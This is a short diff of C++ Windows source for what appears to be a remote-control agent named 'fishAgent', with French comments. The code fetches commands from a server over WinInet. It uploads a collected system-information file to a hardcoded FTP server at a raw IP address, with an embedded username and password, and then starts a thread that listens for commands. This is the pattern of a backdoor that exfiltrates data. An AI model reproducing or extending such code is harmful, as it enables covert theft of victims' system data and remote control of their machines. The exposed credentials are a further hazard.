@@ -34,7 +34,7 @@ string GetCommand() {
     }
     
     // Lire l'UUID du système
-    string uuid = getUUID();
+    string uuid = globalUUID;
 
     HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
@@ -107,6 +107,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         // Uploader les infos système vers le serveur FTP si nécessaire
         uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", 
                         (fishFolder + "\\system_info.dat").c_str(), "system_info.dat");
+    }
+    else {
+        // Lire l'UUID depuis le fichier system_info.dat
+        readUUIDFromFile();
     }
 
     // Démarrer le thread d'écoute des commandes
